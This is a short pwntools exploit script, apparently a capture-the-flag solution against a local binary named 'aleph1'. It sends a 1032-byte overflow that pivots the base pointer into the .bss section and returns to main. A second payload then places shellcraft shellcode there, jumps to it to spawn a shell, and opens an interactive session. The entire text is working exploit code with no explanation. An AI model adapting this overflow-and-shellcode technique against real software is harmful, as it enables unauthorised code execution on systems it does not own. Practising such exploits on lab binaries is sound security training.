from pwn import *

p = process('./aleph1')
context.log_level = 'debug'
context.arch = 'amd64'

rbp_pop = 0x400538
bss_addr = 0x601038
main_offset_addr = 0x4005ce
shellcode = asm(shellcraft.sh())

gdb.attach(p)
playload = 'A'*1032 + p64(rbp_pop) + p64(bss_addr + 0x400) + p64(main_offset_addr)
p.sendline(playload)

playload2 = shellcode + 'A'*(1032 - len(shellcode)) + p64(bss_addr)
p.sendline(playload2)

p.interactive()
